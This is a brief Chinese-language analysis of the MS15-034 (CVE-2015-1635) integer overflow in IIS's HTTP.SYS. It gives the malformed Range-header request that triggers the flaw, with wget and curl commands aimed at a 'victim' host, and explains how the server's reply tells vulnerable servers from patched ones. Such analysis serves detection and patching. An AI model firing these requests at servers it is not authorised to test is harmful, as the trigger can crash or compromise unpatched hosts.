# MS15-034/CVE-2015-1635 远程代码执行漏洞分析

## 漏洞重现

结合Pastebin网站上贴出的信息（http://pastebin.com/ypURDPc4）

和微软公告，我们知道这是一个位`于HTTP.SYS`中的`整数溢出漏洞`，根据Pastebin网站的python代码，我们知道通过给IIS服务器发送这样格式的HTTP请求，就可以触发（检测）这个漏洞：
```
GET / HTTP/1.1
Host: stuff
Range: bytes=0-18446744073709551615
```
我们直接使用`wget或curl`工具，也可以直接测试这个漏洞，例如使用如下命令行：
```
wget 127.0.0.1 –debug –header=”Range: bytes=0-18446744073709551615″
```
curl版本:
```
 curl  -H"Range: bytes=18-18446744073709551615"  victim/welcome.png 
```



此处`18446744073709551615`转为十六进制即是 `0xFFFFFFFFFFFFFFFF`(16个F），是64位无符号整形所能表达的最大整数，那么我们很容易可以想到，这个“`整数溢出`”必然同这个异常的超大整数有关。

Pastebin上POC的作者提供的检测工具代码认为，如上请求包，若IIS服务器返回

“`Requested Range Not Satisfiable`”
> 请求的范围不能满足

则是存在漏洞，否则如果返回

”`The request has an invalid header name`“，
> 请求的头名无效
则说明漏洞已经修补。



